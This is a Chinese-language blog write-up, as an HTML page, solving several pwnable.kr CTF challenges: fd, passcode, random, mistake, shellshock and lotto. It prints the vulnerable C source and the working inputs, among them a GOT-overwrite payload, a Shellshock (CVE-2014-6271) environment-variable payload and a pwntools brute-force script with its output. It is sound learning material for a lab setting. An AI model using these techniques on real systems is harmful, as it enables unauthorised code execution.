<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Pwnable.kr | JuicyMio's Blog</title>
<meta name=keywords content="pwn"><meta name=description content='pwnable.kr writeup
1 fd
文件描述符(file descricptor)

维基百科：文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。

习惯上 标准输入(stdin)为0, 标准输出(stdout)为1, 标准错误(stderr)为2.
//fd.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
    if(argc<2){
        printf("pass argv[1] a number\n");
        return 0;
    }
    int fd = atoi( argv[1] ) - 0x1234;
    int len = 0;
    len = read(fd, buf, 32);
    if(!strcmp("LETMEWIN\n", buf)){
        printf("good job :)\n");
        system("/bin/cat flag");
        exit(0);
    }
    printf("learn about Linux file IO\n");
    return 0;
}
得到flag的关键在于如何通过第二个if语句, 也就是如何让buf=LETMEMIN
可以看到read从fd中读入32个字节为buf赋值, 如果我们想控制buf的值就要控制fd中的内容, 那么只要让fd=0, 再向标准输入(从命令行直接输入)中输入LETMEWIN就可以了.
注意到fd在此处赋值:
int fd = atoi( argv[1] ) - 0x1234;
其中atoi是将字符串转化为整数的函数
int main(int argc, char* argv[], char* envp[]){
可以看到argv[]是main函数的一个参数, 而main函数的参数都是程序运行时在命令行输入的, argc代表输入参数的个数(第一个参数是程序路径), argv则存储着指向这些参数的指针. envp存储指向环境变量的指针, 此处没用到.
例如运行程序fd
./fd 4660
此时argc值为2, 而argv[0] = &ldquo;./fd&rdquo;, argv[1] = &ldquo;4660&rdquo;
atoi不能转化16进制数, 所以我们手动转换0x1234, 它的十进制表示是4660
这样我们就可以让fd = 0, 程序等待从stdin中读取字符
我们再向命令行中输入LETMEWIN, 即可得到flag'><meta name=author content="JuicyMio"><link rel=canonical href=https://juicymio.github.io/posts/pwnable.kr/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as=style><link rel=icon href=https://juicymio.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://juicymio.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://juicymio.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://juicymio.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://juicymio.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://juicymio.github.io/posts/pwnable.kr/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Pwnable.kr"><meta property="og:description" content='pwnable.kr writeup
1 fd
文件描述符(file descricptor)

维基百科：文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。

习惯上 标准输入(stdin)为0, 标准输出(stdout)为1, 标准错误(stderr)为2.
//fd.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
    if(argc<2){
        printf("pass argv[1] a number\n");
        return 0;
    }
    int fd = atoi( argv[1] ) - 0x1234;
    int len = 0;
    len = read(fd, buf, 32);
    if(!strcmp("LETMEWIN\n", buf)){
        printf("good job :)\n");
        system("/bin/cat flag");
        exit(0);
    }
    printf("learn about Linux file IO\n");
    return 0;
}
得到flag的关键在于如何通过第二个if语句, 也就是如何让buf=LETMEMIN
可以看到read从fd中读入32个字节为buf赋值, 如果我们想控制buf的值就要控制fd中的内容, 那么只要让fd=0, 再向标准输入(从命令行直接输入)中输入LETMEWIN就可以了.
注意到fd在此处赋值:
int fd = atoi( argv[1] ) - 0x1234;
其中atoi是将字符串转化为整数的函数
int main(int argc, char* argv[], char* envp[]){
可以看到argv[]是main函数的一个参数, 而main函数的参数都是程序运行时在命令行输入的, argc代表输入参数的个数(第一个参数是程序路径), argv则存储着指向这些参数的指针. envp存储指向环境变量的指针, 此处没用到.
例如运行程序fd
./fd 4660
此时argc值为2, 而argv[0] = &ldquo;./fd&rdquo;, argv[1] = &ldquo;4660&rdquo;
atoi不能转化16进制数, 所以我们手动转换0x1234, 它的十进制表示是4660
这样我们就可以让fd = 0, 程序等待从stdin中读取字符
我们再向命令行中输入LETMEWIN, 即可得到flag'><meta property="og:type" content="article"><meta property="og:url" content="https://juicymio.github.io/posts/pwnable.kr/"><meta property="og:image" content="https://juicymio.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-10-12T17:19:11+08:00"><meta property="article:modified_time" content="2022-10-12T17:19:11+08:00"><meta property="og:site_name" content="JuicyMio's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://juicymio.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Pwnable.kr"><meta name=twitter:description content='pwnable.kr writeup
1 fd
文件描述符(file descricptor)

维基百科：文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。

习惯上 标准输入(stdin)为0, 标准输出(stdout)为1, 标准错误(stderr)为2.
//fd.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
    if(argc<2){
        printf("pass argv[1] a number\n");
        return 0;
    }
    int fd = atoi( argv[1] ) - 0x1234;
    int len = 0;
    len = read(fd, buf, 32);
    if(!strcmp("LETMEWIN\n", buf)){
        printf("good job :)\n");
        system("/bin/cat flag");
        exit(0);
    }
    printf("learn about Linux file IO\n");
    return 0;
}
得到flag的关键在于如何通过第二个if语句, 也就是如何让buf=LETMEMIN
可以看到read从fd中读入32个字节为buf赋值, 如果我们想控制buf的值就要控制fd中的内容, 那么只要让fd=0, 再向标准输入(从命令行直接输入)中输入LETMEWIN就可以了.
注意到fd在此处赋值:
int fd = atoi( argv[1] ) - 0x1234;
其中atoi是将字符串转化为整数的函数
int main(int argc, char* argv[], char* envp[]){
可以看到argv[]是main函数的一个参数, 而main函数的参数都是程序运行时在命令行输入的, argc代表输入参数的个数(第一个参数是程序路径), argv则存储着指向这些参数的指针. envp存储指向环境变量的指针, 此处没用到.
例如运行程序fd
./fd 4660
此时argc值为2, 而argv[0] = &ldquo;./fd&rdquo;, argv[1] = &ldquo;4660&rdquo;
atoi不能转化16进制数, 所以我们手动转换0x1234, 它的十进制表示是4660
这样我们就可以让fd = 0, 程序等待从stdin中读取字符
我们再向命令行中输入LETMEWIN, 即可得到flag'><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://juicymio.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Pwnable.kr","item":"https://juicymio.github.io/posts/pwnable.kr/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Pwnable.kr","name":"Pwnable.kr","description":"pwnable.kr writeup 1 fd 文件描述符(file descricptor)\n维基百科：文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。\n习惯上 标准输入(stdin)为0, 标准输出(stdout)为1, 标准错误(stderr)为2.\n//fd.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc\u0026lt;2){ printf(\u0026#34;pass argv[1] a number\\n\u0026#34;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\u0026#34;LETMEWIN\\n\u0026#34;, buf)){ printf(\u0026#34;good job :)\\n\u0026#34;); system(\u0026#34;/bin/cat flag\u0026#34;); exit(0); } printf(\u0026#34;learn about Linux file IO\\n\u0026#34;); return 0; } 得到flag的关键在于如何通过第二个if语句, 也就是如何让buf=LETMEMIN 可以看到read从fd中读入32个字节为buf赋值, 如果我们想控制buf的值就要控制fd中的内容, 那么只要让fd=0, 再向标准输入(从命令行直接输入)中输入LETMEWIN就可以了. 注意到fd在此处赋值:\nint fd = atoi( argv[1] ) - 0x1234; 其中atoi是将字符串转化为整数的函数\nint main(int argc, char* argv[], char* envp[]){ 可以看到argv[]是main函数的一个参数, 而main函数的参数都是程序运行时在命令行输入的, argc代表输入参数的个数(第一个参数是程序路径), argv则存储着指向这些参数的指针. envp存储指向环境变量的指针, 此处没用到.\n例如运行程序fd\n./fd 4660 此时argc值为2, 而argv[0] = \u0026ldquo;./fd\u0026rdquo;, argv[1] = \u0026ldquo;4660\u0026rdquo;\natoi不能转化16进制数, 所以我们手动转换0x1234, 它的十进制表示是4660 这样我们就可以让fd = 0, 程序等待从stdin中读取字符 我们再向命令行中输入LETMEWIN, 即可得到flag\n","keywords":["pwn"],"articleBody":"pwnable.kr writeup 1 fd 文件描述符(file descricptor)\n维基百科：文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。\n习惯上 标准输入(stdin)为0, 标准输出(stdout)为1, 标准错误(stderr)为2.\n//fd.c #include #include #include char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc\u003c2){ printf(\"pass argv[1] a number\\n\"); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\"LETMEWIN\\n\", buf)){ printf(\"good job :)\\n\"); system(\"/bin/cat flag\"); exit(0); } printf(\"learn about Linux file IO\\n\"); return 0; } 得到flag的关键在于如何通过第二个if语句, 也就是如何让buf=LETMEMIN 可以看到read从fd中读入32个字节为buf赋值, 如果我们想控制buf的值就要控制fd中的内容, 那么只要让fd=0, 再向标准输入(从命令行直接输入)中输入LETMEWIN就可以了. 注意到fd在此处赋值:\nint fd = atoi( argv[1] ) - 0x1234; 其中atoi是将字符串转化为整数的函数\nint main(int argc, char* argv[], char* envp[]){ 可以看到argv[]是main函数的一个参数, 而main函数的参数都是程序运行时在命令行输入的, argc代表输入参数的个数(第一个参数是程序路径), argv则存储着指向这些参数的指针. envp存储指向环境变量的指针, 此处没用到.\n例如运行程序fd\n./fd 4660 此时argc值为2, 而argv[0] = “./fd”, argv[1] = “4660”\natoi不能转化16进制数, 所以我们手动转换0x1234, 它的十进制表示是4660 这样我们就可以让fd = 0, 程序等待从stdin中读取字符 我们再向命令行中输入LETMEWIN, 即可得到flag\n2 collision 5 passcode 这题没太懂GOT PLT那里的具体原理\n#include #include void login(){ int passcode1; int passcode2; printf(\"enter passcode1 : \"); scanf(\"%d\", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(\"enter passcode2 : \"); scanf(\"%d\", passcode2); printf(\"checking...\\n\"); if(passcode1==338150 \u0026\u0026 passcode2==13371337){ printf(\"Login OK!\\n\"); system(\"/bin/cat flag\"); } else{ printf(\"Login Failed!\\n\"); exit(0); } } void welcome(){ char name[100]; printf(\"enter you name : \"); scanf(\"%100s\", name); printf(\"Welcome %s!\\n\", name); } int main(){ printf(\"Toddler's Secure Login System 1.0 beta.\\n\"); welcome(); login(); // something after login... printf(\"Now I can safely trust you that you have credential :)\\n\"); return 0; } 容易注意到login函数中这句\nscanf(\"%d\", passcode1); 本应该为\nscanf(\"%d\", \u0026passcode1); 也就是说scanf本该向passcode1所在地址写入内容, 却变成了将passcode1中存入的数作为地址, 向其写入内容. 这给了我们可乘之机, 如果能够覆盖passcode1的内容, 就可以向这个地址写入内容. 那么如何修改passcode1呢? 自然我们要看在其之前执行的welcome函数, 它读入了100个字符. 用IDA反编译一下\nint login() { int v1; // [esp+18h] [ebp-10h] int v2; // [esp+1Ch] [ebp-Ch] printf(\"enter passcode1 : \"); __isoc99_scanf(\"%d\", v1); fflush(stdin); printf(\"enter passcode2 : \"); __isoc99_scanf(\"%d\", v2); puts(\"checking...\"); if ( v1 != 338150 || v2 != 13371337 ) { puts(\"Login Failed!\"); exit(0); } puts(\"Login OK!\"); return system(\"/bin/cat flag\"); } unsigned int welcome() { char v1[100]; // [esp+18h] [ebp-70h] BYREF unsigned int v2; // [esp+7Ch] [ebp-Ch] v2 = __readgsdword(0x14u); printf(\"enter you name : \"); __isoc99_scanf(\"%100s\", v1); printf(\"Welcome %s!\\n\", v1); return __readgsdword(0x14u) ^ v2; } 由于welcome和login紧挨着先后执行, 那么代表栈底的ebp应该没有改变. login中的v1即passcode1在ebp-10h的位置, welcome中的v1即name在ebp-70h的位置, 70h-10h = 60h = 96. 也就是他们位置相差96字节, 而我们可以输入100个字节, 这多出的4个字节就正好可以覆盖passcode1. 如果把passcode1覆盖成printf函数的GOT,再在scanf向passcode1内的地址, 即我们覆盖的printf的GOT写入时输入system的GOT, 就可以将即将执行的printf变成system(\"/bin/cat flag\")这个指令了. 在IDA里找到他们:\n.plt:08048420 .plt:08048420 ; =============== S U B R O U T I N E ======================================= .plt:08048420 .plt:08048420 ; Attributes: thunk .plt:08048420 .plt:08048420 ; int printf(const char *format, ...) .plt:08048420 _printf proc near ; CODE XREF: login+E↓p .plt:08048420 ; login+3C↓p ... .plt:08048420 .plt:08048420 format = dword ptr 4 .plt:08048420 .plt:08048420 jmp ds:off_804A000 .plt:08048420 _printf endp .plt:08048420 .text:08048562 ; --------------------------------------------------------------------------- .text:08048563 align 4 .text:08048564 .text:08048564 ; =============== S U B R O U T I N E ======================================= .text:08048564 .text:08048564 ; Attributes: bp-based frame .text:08048564 .text:08048564 public login .text:08048564 login proc near ; CODE XREF: main+1A↓p .text:08048564 .text:08048564 var_10 = dword ptr -10h .text:08048564 var_C = dword ptr -0Ch .text:08048564 .text:08048564 ; __unwind { .text:08048564 push ebp .text:08048565 mov ebp, esp .text:08048567 sub esp, 28h .text:0804856A mov eax, offset format ; \"enter passcode1 : \" .text:0804856F mov [esp], eax ; format .text:08048572 call _printf .text:08048577 mov eax, offset aD ; \"%d\" .text:0804857C mov edx, [ebp+var_10] .text:0804857F mov [esp+4], edx .text:08048583 mov [esp], eax .text:08048586 call ___isoc99_scanf .text:0804858B mov eax, ds:stdin@@GLIBC_2_0 .text:08048590 mov [esp], eax ; stream .text:08048593 call _fflush .text:08048598 mov eax, offset aEnterPasscode2 ; \"enter passcode2 : \" .text:0804859D mov [esp], eax ; format .text:080485A0 call _printf .text:080485A5 mov eax, offset aD ; \"%d\" .text:080485AA mov edx, [ebp+var_C] .text:080485AD mov [esp+4], edx .text:080485B1 mov [esp], eax .text:080485B4 call ___isoc99_scanf .text:080485B9 mov dword ptr [esp], offset s ; \"checking...\" .text:080485C0 call _puts .text:080485C5 cmp [ebp+var_10], 528E6h .text:080485CC jnz short loc_80485F1 .text:080485CE cmp [ebp+var_C], 0CC07C9h .text:080485D5 jnz short loc_80485F1 .text:080485D7 mov dword ptr [esp], offset aLoginOk ; \"Login OK!\" .text:080485DE call _puts .text:080485E3 mov dword ptr [esp], offset command ; \"/bin/cat flag\" .text:080485EA call _system .text:080485EF leave .text:080485F0 retn 0x080485e3=134514147\n实现: python -c 'print \"A\"*96+\"\\x00\\xa0\\x04\\x08\"+\"134514147\\n\"' | ./passcode 6 random #include int main(){ unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(\"%d\", \u0026key); if( (key ^ random) == 0xdeadbeef ){ printf(\"Good!\\n\"); system(\"/bin/cat flag\"); return 0; } printf(\"Wrong, maybe you should try 2^32 cases.\\n\"); return 0; } 注意到rand()没有用srand()设定种子, 那么种子默认为1, 生成的随机数应该是一个固定的序列. 我们在本地编译, 用gdb调试该程序, 得到random的值为1804289383. 而key^random的值应该是0xdeadbeef, 由于^的逆运算是它本身, deadbeef^random=key. 算出key = -1255736440, 运行random程序输入key得到flag\nrandom@pwnable:~$ ./random -1255736440 Good! Mommy, I thought libc random is unpredictable... 7 input 8 leg 9 mistake We all make mistakes, let's move on. (don't take this too seriously, no fancy hacking skill is required at all) This task is based on real event Thanks to dhmonkey hint : operator priority ssh mistake@pwnable.kr -p2222 (pw:guest) 提示是操作符的优先级\n#include #include #define PW_LEN 10 #define XORKEY 1 void xor(char* s, int len){ int i; for(i=0; i\u003clen; i++){ s[i] ^= XORKEY; } } int main(int argc, char* argv[]){ int fd; if(fd=open(\"/home/mistake/password\",O_RDONLY,0400) \u003c 0){ printf(\"can't open password %d\\n\", fd); return 0; } printf(\"do not bruteforce...\\n\"); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) \u003e 0)){ printf(\"read error\\n\"); close(fd); return 0; } char pw_buf2[PW_LEN+1]; printf(\"input password : \"); scanf(\"%10s\", pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN)){ printf(\"Password OK\\n\"); system(\"/bin/cat flag\\n\"); } else{ printf(\"Wrong Password\\n\"); } close(fd); return 0; } 观察这一行\nif(fd=open(\"/home/mistake/password\",O_RDONLY,0400) \u003c 0){ 乍一看没什么不对, 当返回的文件描述符小于0时报错 但是\u003c是比=优先级高的, 所以事实上首先open()会返回3(0, 1, 2是什么见第1题fd), 然后执行3\u003c0这个表达式, 它的值是0. 最后执行fd=0, 由第一题fd我们学到了fd = 0是stdin. 所以事实上password是我们输入的. 然后我们再来看xor这个函数, 它将一个字符串的前n个字符与1异或. 题目中给出的是前10个字符. 所以我们只需要先输入10个字符作为password, 再输入这些字符异或1得到的字符串. 由于字符'0’的ascii码为110000, 字符'1’的ascii码为110001, 恰好'0’^1 = ‘1’. 所以只需进行如下操作\n./mistake do not bruteforce... 0000000000 1111111111input password : Password OK Mommy, the operator priority always confuses me :( 10 shellshock 这是一个set-uid程序:\n#include int main(){ setresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); system(\"/home/shellshock/bash -c 'echo shock_me'\"); return 0; } 这是一个别名为shellshock的漏洞, CVE-2014-6271 原理大概是bash读取环境变量时会调用后面的函数, 在调用bash时会直接触发\nexport foo='{:;}; echo test' bash test 测试方法:\nshellshock@pwnable:~$ env x='() { :;}; echo vulnerable' bash -c \"echo this is a test\" this is a test shellshock@pwnable:~$ env x='() { :;}; echo vulnerable' ./bash -c \"echo this is a test\" vulnerable 证明环境变量中的bash没有此漏洞, 而当前目录的bash有此漏洞 攻击该程序: 如果real uid和effective uid相同时, 环境变量在程序内有效, 就可以利用这个漏洞. 而本题代码中\nsetresuid(getegid(), getegid(), getegid()); setresgid(getegid(), getegid(), getegid()); 确保了这一点. 所以可以这样攻击:\nshellshock@ubuntu:~$ env x='() { :;}; /bin/cat flag' ./shellshock only if I knew CVE-2014-6271 ten years ago..!! Segmentation fault shellshock@ubuntu:~$ 11 coin1 12 blackjack 13 lotto lotto.c:\n#include #include #include #include unsigned char submit[6]; void play(){ int i; printf(\"Submit your 6 lotto bytes : \"); fflush(stdout); int r; r = read(0, submit, 6); printf(\"Lotto Start!\\n\"); //sleep(1); // generate lotto numbers int fd = open(\"/dev/urandom\", O_RDONLY); if(fd==-1){ printf(\"error. tell admin\\n\"); exit(-1); } unsigned char lotto[6]; if(read(fd, lotto, 6) != 6){ printf(\"error2. tell admin\\n\"); exit(-1); } for(i=0; i\u003c6; i++){ lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 } close(fd); // calculate lotto score int match = 0, j = 0; for(i=0; i\u003c6; i++){ for(j=0; j\u003c6; j++){ if(lotto[i] == submit[j]){ match++; } } } // win! if(match == 6){ system(\"/bin/cat flag\"); } else{ printf(\"bad luck...\\n\"); } } void help(){ printf(\"- nLotto Rule -\\n\"); printf(\"nlotto is consisted with 6 random natural numbers less than 46\\n\"); printf(\"your goal is to match lotto numbers as many as you can\\n\"); printf(\"if you win lottery for *1st place*, you will get reward\\n\"); printf(\"for more details, follow the link below\\n\"); printf(\"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\\n\\n\"); printf(\"mathematical chance to win this game is known to be 1/8145060.\\n\"); } int main(int argc, char* argv[]){ // menu unsigned int menu; while(1){ printf(\"- Select Menu -\\n\"); printf(\"1. Play Lotto\\n\"); printf(\"2. Help\\n\"); printf(\"3. Exit\\n\"); scanf(\"%d\", \u0026menu); switch(menu){ case 1: play(); break; case 2: help(); break; case 3: printf(\"bye\\n\"); return 0; default: printf(\"invalid menu\\n\"); break; } } return 0; } 看这段:\nfor(i=0; i\u003c6; i++){ for(j=0; j\u003c6; j++){ if(lotto[i] == submit[j]){ match++; } } } 原本应该是lotto和submit按顺序一一对应, 但是这段代码写成了对于lotto中的每一位, 只要submit中有x个与它相同就会使match+x. 这大大降低了枚举难度. 我们只要认死一个1~45中的字符, 比如’#’, 一直输入 “######”, 只要随机出的lotto中有一个#, 就可以让match+6, 从而得到flag. 不会写代码识别flag, 所以我只能人工盯着屏幕看了\nfrom pwn import * s = ssh(host='pwnable.kr',user='lotto', port=2222, password='guest') p = s.process('./lotto') while 1: p.sendline(\"1\") p.sendline(\"######\") print(p.recvline()) # s.interactive() 可以看到得到flag还是很快的, 看到flag就可以ctrl+c结束脚本了\n[+] Starting remote process bytearray(b'./lotto') on pwnable.kr: pid 281220 /home/juicymio/mycode/lotto.py:5: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes p.sendline(\"1\") /home/juicymio/mycode/lotto.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes p.sendline(\"######\") b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'sorry mom... I FORGOT to check duplicate numbers... :(\\n' // 第一次出现flag在这 b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play Lotto\\n' b'2. Help\\n' b'3. Exit\\n' b'Submit your 6 lotto bytes : Lotto Start!\\n' b'bad luck...\\n' b'- Select Menu -\\n' b'1. Play 